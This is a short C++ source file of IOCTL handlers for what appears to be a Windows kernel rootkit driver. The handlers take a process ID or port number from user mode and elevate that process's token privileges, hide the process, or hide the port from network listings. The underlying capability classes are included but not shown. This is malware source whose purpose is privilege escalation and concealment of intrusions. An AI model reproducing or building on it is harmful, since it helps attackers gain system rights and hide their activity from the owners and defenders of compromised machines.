#include "IoctlHandlers.h"
#include "lib/Process.h"
#include "Capabilities/ProcessCapabilities/ProcessHider.h"
#include "Capabilities/TokenCapabilities/TokenElevator.h"
#include "Capabilities/NetworkCapabilites/PortHider.h"
#include "Config.h"

NTSTATUS IoctlHandlers::elevateToken(PIRP irp) {
	auto status = STATUS_SUCCESS;
	auto pid = reinterpret_cast<PULONG>(irp->AssociatedIrp.SystemBuffer);

	if (pid == nullptr) {
		irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	auto process = Process(*pid);
	
	auto tokenElevator = TokenElevator(process);
	status = tokenElevator.elevate();

	irp->IoStatus.Information = 0;
	irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::hideProcess(PIRP irp) {
	auto status = STATUS_SUCCESS;

	const auto pid = reinterpret_cast<PULONG>(irp->AssociatedIrp.SystemBuffer);
	if (pid == nullptr) {
		irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}
	auto process = Process(*pid);
	auto processHider = ProcessHider(process);

	status = processHider.hide();

	irp->IoStatus.Information = 0;
	irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::hidePort(PIRP irp) {
	auto status = STATUS_SUCCESS;
	auto port = reinterpret_cast<PUSHORT>(irp->AssociatedIrp.SystemBuffer);

	if (*port <= static_cast<USHORT>(0) || *port > static_cast<USHORT>(65535)) {
		return STATUS_INVALID_PARAMETER;
	}

	// Add the desired port to the list of hidden ports.
	PortHider::addHiddenPort(*port);

	irp->IoStatus.Status = status;
	irp->IoStatus.Information = 0;
	return status;
}
